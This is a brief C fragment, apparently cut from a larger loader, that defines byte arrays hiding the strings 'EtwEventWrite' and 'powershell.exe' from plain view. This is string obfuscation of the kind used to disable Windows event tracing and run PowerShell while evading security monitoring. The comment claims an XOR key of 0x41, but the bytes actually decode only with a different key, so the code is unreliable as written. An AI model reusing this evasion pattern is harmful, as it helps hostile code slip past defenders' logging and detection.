...
static const unsigned char xEtwEventWrite[] = {
    0xC6, 0xF7, 0xF4, 0xC6, 0xF5, 0xE6, 0xED, 0xF7,
    0xD4, 0xF1, 0xEA, 0xF7, 0xE6
};
#define xEtwEventWrite_LEN 13

/* "powershell.exe" XOR 0x41 */
static const unsigned char xPowerShell[] = {
    0xF3, 0xEC, 0xF4, 0xE6, 0xF1, 0xF0, 0xEB, 0xE6,
    0xEF, 0xEF, 0xAD, 0xE6, 0xFB, 0xE6
};
